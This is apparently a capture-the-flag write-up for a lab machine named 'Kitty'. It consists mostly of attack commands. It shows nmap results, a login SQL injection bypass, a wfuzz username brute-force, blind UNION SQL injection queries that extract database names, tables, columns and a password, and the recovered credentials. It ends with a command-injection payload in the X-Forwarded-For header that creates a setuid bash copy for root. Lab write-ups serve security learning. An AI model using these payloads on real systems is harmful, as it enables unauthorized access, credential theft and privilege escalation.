# Kitty

10.10.237.211

## nmap

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b0:c5:69:e6:dd:6b:81:0c:da:32:be:41:e3:5b:97:87 (RSA)
|   256 6c:65:ad:87:08:7a:3e:4c:7d:ea:3a:30:76:4d:04:16 (ECDSA)
|_  256 2d:57:1d:56:f6:56:52:29:ea:aa:da:33:b2:77:2c:9c (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## http 80

sqli: user'-- -

```sh
wfuzz --hh 1147 -c -w /usr/share/wordlists/seclists/Usernames/Names/names.txt  -d "username=FUZZ%27--+-&password=sqdfqsdfsqdfsdf" http://10.10.181.136/index.php
```
=> kitty

### SQLI

```sql
' UNION SELECT 1,2,3,4-- -
```

=> 4 columns

#### DB

```sql
' UNION SELECT 1,2,3,4 FROM information_schema.schemata WHERE schema_name LIKE BINARY "a%"-- -
```

- bf_databases.py

    - devsite
    - information_schema
    - mywebsite
    - performance_schema

#### TABLES

```sql
' UNION SELECT 1,2,3,4 FROM information_schema.tables WHERE table_schema = 'mywebsite' AND table_name LIKE BINARY 'u%'-- -
```

For mywebsite:
- siteusers

For devsite:
- siteusers

#### COLUMNS

```sql
' UNION SELECT 1,2,3,4 FROM information_schema.COLUMNS WHERE table_schema = 'mywebsite' AND table_name = 'siteusers' AND COLUMN_NAME LIKE BINARY 'u%'-- -
```

For mywebsite:
- created_at
- id
- password
- username

For devsite:
- created_at
- id
- password
- username

#### PASSWORD

```sql
' UNION SELECT 1,2,3,4 FROM siteusers WHERE username = 'kitty' AND password LIKE BINARY '{result}{char}%'-- -
```

L0ng_Liv3_KittY

## foothold

kitty:L0ng_Liv3_KittY

## root

In /opt/log_checker.sh, it reads content of /var/www/development/logged

It is filled when a forbidden word is used in index.php using field X-Forwarded-For

To access this page, we check /etc/apache2/sites-enabled/dev_site.conf
-> <VirtualHost 127.0.0.1:8080>

To visit it:
ssh -L 8081:localhost:8080 kitty@10.10.39.28

Use the password 'sleep' to trig "SQL Injection detected. This incident will be logged"

In burp:
X-Forwarded-For: && cp /bin/bash /tmp/kikou && chmod +s /tmp/kikou
